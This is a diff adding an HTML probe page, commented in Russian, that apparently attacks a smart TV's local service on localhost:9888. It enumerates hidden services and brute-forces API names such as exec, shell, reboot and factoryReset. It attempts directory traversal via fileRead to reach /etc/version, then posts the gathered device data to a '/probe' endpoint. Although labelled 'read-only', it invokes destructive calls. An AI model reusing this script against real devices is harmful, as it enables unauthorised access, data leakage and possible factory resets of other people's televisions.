@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>tv service probe</title>
+<style>
+ body{font:16px/1.3 sans-serif;background:#111;color:#eee;margin:0;padding:16px}
+ h1{font-size:18px;margin:0 0 8px}
+ #log{white-space:pre-wrap;font-family:monospace;font-size:12px}
+ .ok{color:#6f6}.bad{color:#f66}.dim{color:#888}.hit{color:#ff0}
+</style>
+</head>
+<body>
+<h1>службы и api: перебор <small class="dim">read-only</small></h1>
+<div id="log"></div>
+<script>
+/* Локальная служба на телевизоре: https://localhost:9888/service/<name>?api=&args=
+   Пробуем дотянуться из страницы, перебираем имена api у hiutils,
+   смотрим на ресурсы страницы (где лежит SDK). Ничего не устанавливаем. */
+var API = "", log_lines = [], out = { services: [], apis: [], traversal: [], resources: [] };
+var MARK = "ZQTRV";
+
+function log(m, c) {
+  var el = document.getElementById("log"), d = document.createElement("div");
+  if (c) d.className = c; d.textContent = String(m).slice(0, 300); el.appendChild(d);
+}
+function post(p, o, cb) {
+  try { var x = new XMLHttpRequest(); x.open("POST", API + p, true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.onreadystatechange = function () { if (x.readyState === 4 && cb) cb(x.status); };
+    x.send(JSON.stringify(o)); } catch (e) { if (cb) cb(0); }
+}
+function call(api, args) {
+  try { return window.HiUtils_createRequest(api, args); }
+  catch (e) { return { thrown: String(e && e.message || e) }; }
+}
+
+/* ---------- 1. локальные службы из страницы ---------- */
+var SERVICES = ["pkgmgr", "hiutils", "file", "files", "tvapi", "tvinfo", "appconfig",
+                "system", "upgrade", "ota", "debug", "shell", "exec", "log", "network"];
+var svcDone = 0;
+SERVICES.forEach(function (name) {
+  var url = "https://localhost:9888/service/" + name + "?api=getInstalledPkgs&args=%22%22";
+  var rec = { name: name, url: url, status: null, text: null, error: null };
+  try {
+    var x = new XMLHttpRequest();
+    x.open("GET", url, true);
+    x.timeout = 4000;
+    x.onload = function () { rec.status = x.status; rec.text = String(x.responseText || "").slice(0, 400); done(); };
+    x.onerror = function () { rec.error = "onerror"; done(); };
+    x.ontimeout = function () { rec.error = "timeout"; done(); };
+    x.send();
+  } catch (e) { rec.error = String(e && e.message || e); done(); }
+  function done() {
+    out.services.push(rec);
+    if (rec.status === 200) log("OK   /" + name + " -> " + rec.text, "hit");
+    else log("     /" + name + " -> " + (rec.error || rec.status), "dim");
+    if (++svcDone === SERVICES.length) step2();
+  }
+});
+
+/* ---------- 2. перебор имён api у hiutils ---------- */
+var APIS = ["fileRead","fileWrite","fileDelete","fileExists","fileStat","fileInfo","getFileInfo",
+  "dirRead","readDir","listDir","getDirList","getFileList","listFiles","getFiles","fileList",
+  "getVersionStatus","getOSVersion","deviceCode","getDeviceCode","getDeviceInfo","getSN","serial",
+  "getMac","getMAC","getWifiInfo","getNetworkInfo","setVolume","getVolume","reboot","shutdown",
+  "factoryReset","getFactoryState","setFactoryState","openFactory","getServiceMenu","serviceMode",
+  "getHotelMode","setHotelMode","getCountry","getRegion","getPanelInfo","getPanelType","getChipId",
+  "getAppList","getInstalledApps","installApp","uninstallApp","startApp","killApp","getLog","logcat",
+  "getUptime","exec","shell","cmd","run","screenshot","capture","dump","getDump","dbQuery","getDb",
+  "getSetting","setSetting","getParam","setParam","tvapi","getTvApi","hiutils","help","version","ping"];
+
+function step2() {
+  var real = [], i = 0;
+  function next() {
+    if (i >= APIS.length) {
+      out.apis = real;
+      log("не-'Not supported' api: " + real.length, "hit");
+      step3();
+      return;
+    }
+    var name = APIS[i++];
+    var r = call(name, "");
+    var s = JSON.stringify(r === undefined ? null : r).slice(0, 220);
+    var supported = s.indexOf("Not supported api") < 0;
+    if (supported) { real.push({ api: name, result: s }); log("HIT  " + name + " -> " + s, "hit"); }
+    setTimeout(next, 0);
+  }
+  next();
+}
+
+/* ---------- 3. обход каталогов через fileRead ---------- */
+function step3() {
+  var paths = ["../../../../../../etc/version", "../../../../etc/version",
+               "..%2f..%2f..%2fetc/version", "/../../etc/version", "APPS:pkgs/../../etc/version"];
+  for (var i = 0; i < paths.length; i++) {
+    var r = call("fileRead", { path: paths[i] });
+    var s = JSON.stringify(r === undefined ? null : r).slice(0, 240);
+    out.traversal.push({ path: paths[i], result: s });
+    log("trav " + paths[i] + " -> " + s, "dim");
+  }
+  step4();
+}
+
+/* ---------- 4. где лежит SDK ---------- */
+function step4() {
+  try {
+    var res = performance.getEntriesByType("resource");
+    for (var i = 0; i < res.length; i++) out.resources.push({ name: res[i].name, type: res[i].initiatorType });
+  } catch (e) {}
+  var scripts = [];
+  try { var ss = document.getElementsByTagName("script"); for (var j = 0; j < ss.length; j++) scripts.push(ss[j].src); } catch (e) {}
+  out.scripts = scripts;
+  out.userAgent = navigator.userAgent;
+  log("ресурсов: " + out.resources.length + ", скриптов: " + scripts.length, "dim");
+  post("/probe", Object.assign({ name: "services" }, out), function (st) {
+    log(st === 200 ? "готово: отправлено" : "ошибка отправки " + st, st === 200 ? "ok" : "bad");
+  });
+}
+</script>
+</body>
+</html>
